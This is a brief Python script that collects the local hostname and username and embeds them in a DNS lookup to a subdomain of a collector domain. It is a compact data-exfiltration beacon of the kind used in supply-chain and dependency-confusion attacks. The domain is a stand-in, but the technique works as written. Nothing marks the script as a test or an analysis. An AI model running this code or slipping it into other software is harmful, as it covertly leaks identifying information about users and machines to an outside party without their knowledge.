import socket
import getpass

host = socket.gethostname()
user = getpass.getuser()
socket.getaddrinfo(f"{host}.{user}.collector.invalid", 53)
